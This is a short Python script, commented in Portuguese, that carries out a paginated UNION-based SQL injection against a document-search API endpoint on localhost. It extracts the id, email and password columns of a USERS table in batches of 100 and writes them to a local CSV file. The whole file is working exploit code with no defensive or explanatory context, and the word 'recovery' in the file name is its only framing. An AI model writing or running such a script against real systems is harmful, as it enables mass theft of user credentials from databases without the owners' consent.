import urllib.parse
import requests
import csv
import json

# Função A: Constrói a string SQL e a codifica com urllib.parse.quote
def construir_string_sql(n):
    string_sql = f"1' UNION SELECT id, email, password FROM USERS OFFSET {n} LIMIT 100--"
    string_sql_codificada = urllib.parse.quote(string_sql)
    return string_sql_codificada

# Função B: Executa o pedido HTTP GET e retorna o resultado
def executar_pedido_get(string_sql_codificada):
    url = f"http://localhost:8080/api/documents/search?query={string_sql_codificada}"
    resposta = requests.get(url)
    return resposta.json()

# Função C: Loop iterativo que avança a variável de paginação e guarda o output num ficheiro local
def recuperar_dados():
    with open('recovery_dump.csv', 'w', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["id", "email", "password"])  # Cabeçalho do CSV
        for n in range(0, 5000, 100):
            string_sql_codificada = construir_string_sql(n)
            dados = executar_pedido_get(string_sql_codificada)
            for dado in dados:
                writer.writerow([dado['id'], dado['email'], dado['password']])
            print(f"Pagina {n//100+1} de 50 processada")

recuperar_dados()